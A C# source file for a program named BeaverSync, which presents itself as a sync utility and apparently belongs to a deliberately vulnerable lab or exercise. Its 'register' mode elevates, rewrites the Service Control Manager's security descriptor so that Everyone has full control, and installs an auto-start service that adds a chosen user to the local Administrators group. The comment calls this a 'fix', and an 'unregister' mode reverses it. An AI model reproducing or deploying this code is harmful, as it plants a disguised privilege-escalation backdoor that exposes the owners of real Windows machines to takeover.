using System;
using System.Diagnostics;
using VoidSerpent;

namespace BeaverSync
{
    internal class Program
    {
        //[STAThread]
        static void Main(string[] args)
        {
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("System doesn't meet requirements!");
                return;
            }

            // Normal, non-administrative sync
            if (args.Length == 0)
            {
                Console.WriteLine("Doing a sync!");
                Console.ReadLine();
            }
            else if (args.Length == 1 && args[0] == "register")
            {
                // error, needs a username for second argument
                Console.WriteLine("something bad happened with register");
                Console.ReadLine();
                return;
            }
            else if (args.Length == 2 && args[0] == "register")
            {
                Console.WriteLine(string.Join(" ", args));


                string[] applicationArgs = args;
                if (!BetrayalIsASymptom.IsUserAdmin())
                {
                    string applicationPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    BetrayalIsASymptom.RequestElevation(applicationPath, applicationArgs);
                }
                else
                {
                    Console.WriteLine("Performing registration!");
                    // "Fixing" SCManager
                    string[] regcmd = { "sdset", "scmanager", "D:(A;;KA;;;WD)" };
                    string user = args[1];
                    string addcmd = $"\"net localgroup Administrators {user} /add\"";
                    string[] lpecmd = { "create", "bvSyncService", "displayName=", "bvSyncService", "binPath=", addcmd, "start=", "auto" };
                    RunCmd(process: "sc.exe", args: regcmd);
                    RunCmd(process: "sc.exe", args: lpecmd);

                    // TODO: prompt for restart so service runs with privs
                }
            }
            else if (args.Length == 1 && args[0] == "unregister")
            {
                Console.WriteLine(string.Join(" ", args));
                string[] applicationArgs = args;
                if (!VoidSerpent.BetrayalIsASymptom.IsUserAdmin())
                {
                    string applicationPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    BetrayalIsASymptom.RequestElevation(applicationPath, applicationArgs);
                }
                else
                {
                    Console.WriteLine("Performing unregister!");
                    // "Un-Fixing" SCManager
                    string[] regcmd = { "sdset", "scmanager", "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)" };
                    string[] dgcmd = { "delete", "bvSyncService" };
                    RunCmd(process: "sc.exe", args: regcmd);
                    RunCmd(process: "sc.exe", args: dgcmd);
                }
            }
            else
            {
                Console.WriteLine("something bad happened");
                Console.ReadLine();
                return; // argument not valid
            }
        }

        public static void RunCmd(string process, string[] args)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{process}\"",
                Arguments = string.Join(" ", args),
                Verb = "runas",
                UseShellExecute = false
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }
    }
}
